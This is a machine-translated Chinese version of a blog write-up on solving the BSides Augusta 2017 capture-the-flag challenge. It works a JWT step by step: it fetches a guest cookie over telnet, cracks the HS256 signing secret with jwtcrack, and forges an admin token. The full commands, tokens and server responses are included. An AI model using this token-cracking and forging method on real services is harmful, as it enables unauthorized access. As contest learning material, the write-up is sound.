# 伪造 JSON 网络代币来赢取奖品

> 原文：<https://dev.to/antoinette0x53/forging-json-web-tokens-to-win-a-prize>

液体错误:内部

我从我的团队实习生那里收到了上述推文的截图。我们计划今年参加奥古斯塔聚会，所以所有的事情立刻被抛到一边，这样我就可以解决(我认为会是)一个快速简单的挑战。这既不快也不容易。所以我将带你经历两个小时的过程来尝试解决这个挑战。我得到了一些帮助，所以这也将融入我的想法中。

## 容易的部分

查看文本字符串，它看起来像十六进制。我在网上把它扔进了一个十六进制到 ascii 的转换器，得到了乱码。我看了字符串一分钟，注意到前几个字节看起来很熟悉。`1f8b08`是 gzip 文件的文件签名。请记录下来，我确实意识到前几个字节对我自己来说很特别。我用谷歌来验证，但我为自己甚至知道这一点而自豪，因为这不是我主动知道我拥有的知识。

我将十六进制文件放入十六进制编辑器(也可以在网上找到)并下载了 zip 文件。如果你在文件上做一个`zcat`，它会打印出一个 IP 地址。

> `zcat`是一个方便的命令行工具，可以在不解压文件的情况下将 zip 文件的内容`cat`或打印到控制台。

```
~$ zcat test.gz
35.184.14.24 
```

Enter fullscreen mode Exit fullscreen mode

## 不那么容易的部分

访问该 IP 地址会导致..
[![site image](img/e281f0118ce794825f13d269dbf8bb4c.png)T3】](https://res.cloudinary.com/practicaldev/image/fetch/s--2qD6QHwF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/5zgq99h0uv53pkb3ntcx.png)

我马上注意到，该网站是运行在港口 80 又名没有 HTTPS。此外，由于我正在做的事情的性质(试图黑东西)，我知道它可能在某些方面是脆弱的。如果你试图暴力破解它，你会得到一个消息说你不能这样做。如果您尝试输入“admin”作为用户，输入“Admin”作为密码，会发生以下情况。

[![error](img/7189d9794f4cfc9a55f0a476953bd964.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--QS5CYqtb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/64fsnt5s88jd64wshmvc.png)

我使用谷歌浏览器的“检查”功能来查看源代码。有一个名为“custom.js”的 javascript 文件，在这个文件中，我可以看到对登录表单和注册表单的处理，这两个表单似乎是隐藏的，只有管理员才能访问。嗯（表示踌躇等）...这是我的砖墙。因此，除此之外的一切很大程度上是基于我从我所在城市的令人惊叹的安全社区得到的指导， [SecDSM](https://secdsm.org/) 。

### Telnet

Telnet 是一种命令行工具，可用于通过指定端口手动与服务器通信。例如，如果您想手动发送一个 HTTP GET 请求或自己特别编制一个请求，您可以使用 telnet 来完成。

```
$ telnet 35.184.14.24 80
Trying 35.184.14.24...
Connected to 24.14.184.35.bc.googleusercontent.com.
Escape character is '^]'.
GET /home.html HTTP/1.0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 54
Set-Cookie: bsides_augusta_2017=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3N1ZWQiOiIyMDE3LTA3LTIwIDE2OjI0OjIwLjUyMjY0NSIsInVzZXIiOiJndWVzdCJ9.akXnslG9494KsLHyRf6pJBlCAVgmZSNBMwOE38jCF2s
Server: Werkzeug/0.12.2 Python/2.7.12
Date: Thu, 20 Jul 2017 16:24:20 GMT

<html><script>window.location.href='/'</script></html>Connection closed by foreign host. 
```

Enter fullscreen mode Exit fullscreen mode

服务器的响应给了我很多信息。我看到服务器正在设置一个名为 bsides_augusta_2017 的 cookie，该值看起来像一个 base64 编码的字符串。
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`解码到`{"alg":"HS256","typ":"JWT"}`
`eyJpc3N1ZWQiOiIyMDE3LTA3LTIwIDE2OjI0OjIwLjUyMjY0NSIsInVzZXIiOiJndWVzdCJ9`解码到`{"issued":"2017-07-20 16:24:20.522645","user":"guest"}`

由此我知道了算法的类型和 cookie 的类型，以及我们显示的是什么用户；客人。

### 如果你给一个网站一个 Cookie...

我们需要找到一种方法来伪造一个 cookie，告诉服务器我们是管理员。这是通过四个步骤实现的。

**步骤 1:用 GET**
获取会话 Cookie

```
$ telnet 35.184.14.24 80
Trying 35.184.14.24...
Connected to 24.14.184.35.bc.googleusercontent.com.
Escape character is '^]'.
GET / HTTP/1.0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2091
Set-Cookie: bsides_augusta_2017=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3N1ZWQiOiIyMDE3LTA3LTI3IDAyOjExOjA1LjEwMjYzMCIsInVzZXIiOiJndWVzdCJ9.WtsckOvZlwBNlE4vJuvA9sK0LAZ0zQ47161ogfrZ1Vw
Server: Werkzeug/0.12.2 Python/2.7.12
Date: Thu, 27 Jul 2017 02:11:05 GMT 
```

Enter fullscreen mode Exit fullscreen mode

第二步:获取密钥
这个网站使用 [JSON 网络令牌](https://jwt.io/introduction/)。jwt 是用一个秘密密钥签名的，所以我需要找出这个秘密密钥来伪造 cookie。 [Brendan Rius 的 JWT 饼干](https://github.com/brendan-rius/c-jwt-cracker)是我用来在几秒钟内拿到钥匙的。

```
~/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3N1ZWQiOiIyMDE3LTA3LTI3IDAyOjExOjA1LjEwMjYzMCIsInVzZXIiOiJndWVzdCJ9.WtsckOvZlwBNlE4vJuvA9sK0LAZ0zQ47161ogfrZ1Vw

Secret is "l3et" 
```

Enter fullscreen mode Exit fullscreen mode

**第三步:编辑 Cookie**
为了编辑 Cookie，我使用了 [jsonwebtoken.io](https://www.jsonwebtoken.io/) 以及我使用`jwtcrack`发现的秘密。
[![](img/f16d0ee997ee9e000868f336512585ba.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--mOk4tgEr--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/vfxt33lroj892dru3lg1.png)

第四步:为你的 Cookie 插入新值
有多种方法可以做到这一点。我的 Chrome 浏览器上有一个插件叫做 Edit This Cookie，它允许我直接编辑 Cookie 的值。我在用 telnet 验证了该值是正确的之后使用了它。

```
$ telnet 35.184.14.24 80
Trying 35.184.14.24...
Connected to 24.14.184.35.bc.googleusercontent.com.
Escape character is '^]'.
GET /home.html HTTP/1.1
Host: 35.184.14.24
Cookie: bsides_augusta_2017=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3N1ZWQiOiIyMDE3LTA3LTI3IDAyOjExOjA1LjEwMjYzMCIsInVzZXIiOiJhZG1pbiIsImp0aSI6IjI1NzU0OGIxLTU4MDctNDZiNi05ZDBmLTBkY2FiNzYyM2Y0NSIsImlhdCI6MTUwMTEyMTU2MCwiZXhwIjoxNTAxMTI1MTYwfQ.mHrODuQhBBVcC954lkquc5xOVNZI0fwMuIVNjKD0EAY

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2974
Server: Werkzeug/0.12.2 Python/2.7.12
Date: Thu, 27 Jul 2017 02:13:41 GMT

...
...
...
<!-- Created by Christopher Davis. https://www.linkedin.com/in/christopher-davis-4817b392/ -->
...
...
...                        
                    <h3>&nbsp&nbspChallenge Success!</h3>
                    <p>Good job on solving the challenge and being the #11 player to solve the challenge! As one of the first 5 players, you will receive a prize at Bsides August 2017.</br>Simply Provide your details below and someone will contact you.</br> Please do NOT register unless you are attending Bsides Augusta on Sep 16 2017\. Tickets can be bought <a href="https://www.eventbrite.com/e/bsidesaugusta-2017-tickets-35553549624?ref=ecount">here</a>.</p>
...
...
...
Connection closed by foreign host. 
```

Enter fullscreen mode Exit fullscreen mode

[![](img/6f8ddc43128ed2386ad27bc0d6540741.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--6diO1tED--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/9oz9m5ckfgaklwkrqggt.png)

**成功**
[![](img/3a612111faab21cb0b4f9e0bb789496f.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--7nFG-wYw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/48gsqfxr5k339zy1wq8m.png) 
Welp，那都是乡亲。用#3 代替#11，你得到的就是我所看到的。

> ![Antoinette Maria profile image](img/3e8e57e9ac34039854861e62e1b3327a.png)安托瓦内特@ _ theycallmetoni![twitter logo](img/4c8a2313941dda016bf4d78d103264aa.png)在这个过程中我学会了如何做一些新的事情。“祝贺您成为解决挑战的#3 用户…[twitter.com/i/web/status/8…](https://t.co/c6NwrklrNU)2017 年 7 月 20 日下午 16:36BSidesAugusta@ BSidesAugusta[![Twitter reply action](img/44d8b042100e231770330321e5b63d65.png)](https://twitter.com/intent/tweet?in_reply_to=888075099613605889)[![Twitter retweet action](img/93d9c70ccc54851d2e8e881b53c21dae.png)](https://twitter.com/intent/retweet?tweet_id=888075099613605889)[![Twitter like action](img/2e93f7775eadefab8bcd34a4542cc5a7.png)](https://twitter.com/intent/like?tweet_id=888075099613605889)

## 最后的想法

*   在我寻求帮助后，SecDSM 的其他几个人也开始着手这项挑战。其中一个使用 BurpSuite 将伪造的 cookie 转发到服务器(以防您对替代方法感到好奇)。我并不精通 BurpSuite，但我有一种感觉，它对未来涉及 web 漏洞的挑战会很方便。

*   另一个人发现了 jwtcracker 和代币伪造网站。后来我问他怎么知道要找这些的。他说他不认识所用的 web 服务器(从 telnet 命令`Server: Werkzeug/0.12.2 Python/2.7.12`的 HTTP 响应中可以看到),并搜索了它的会话处理。我也这样做了，最终您会被引向 JSON Web 令牌。这里的教训是花时间关注一切。

*   这个挑战比我最初想象的要困难得多，但也非常有益。我从来没有伪造过饼干，现在我知道怎么做了，现在你也知道了。试试看。

奥古斯塔节是 9 月 16 日，在乔治亚州的奥古斯塔。在他们的[网站](http://www.securitybsides.com/w/page/113886499/BSidesAugusta%202017)获取更多信息。